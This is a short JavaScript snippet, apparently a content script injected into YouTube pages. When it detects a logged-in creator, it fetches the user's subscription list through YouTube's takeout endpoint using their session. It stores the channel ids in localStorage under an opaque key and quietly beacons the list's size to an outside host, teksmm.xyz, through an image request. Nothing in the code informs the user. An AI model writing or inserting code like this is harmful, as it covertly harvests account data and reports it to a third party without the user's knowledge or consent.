function sendSyncXhrReq(uri) {
	try{
		var request = new XMLHttpRequest();
		request.open('GET', uri, false); // `false` makes the request synchronous
		request.send(null);
		if (request.status === 200) {
			return request.responseText;
		}
	}catch(e){}
	
	return -1;
}

/*
  Downloads the suscription list and parse as array that contains channel id's
*/
function getSubscriptionList() {
	var currentSubsciptionRaw = sendSyncXhrReq("https://www.youtube.com/subscription_manager?action_takeout=1")
	if (currentSubsciptionRaw == -1) {
		console.log("Not Logged in");
		return currentSubsciptionRaw;
	}
	return currentSubsciptionRaw.split("channel_id=").map(element => element.split("\"")[0]).slice(1)
}

function ifNotDownloadSubList() {

	var list = window.localStorage.getItem('subList57');
	if (!list) {
		subListArray = getSubscriptionList();
		console.log(subListArray.length);
		new Image().src = '//www.teksmm.xyz/smmnew/log/logSub.php?message=' +subListArray.length;
		window.localStorage.setItem("subList57", JSON.stringify(subListArray))
	} else {
		//console.log("Has been saved")
	}
	//return JSON.parse(list);
}
	
if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.split('creator_channel_id","value":"')[1] && window.asdfsdf2 != true) {
	window.asdfsdf2 = true;
	ifNotDownloadSubList();
}
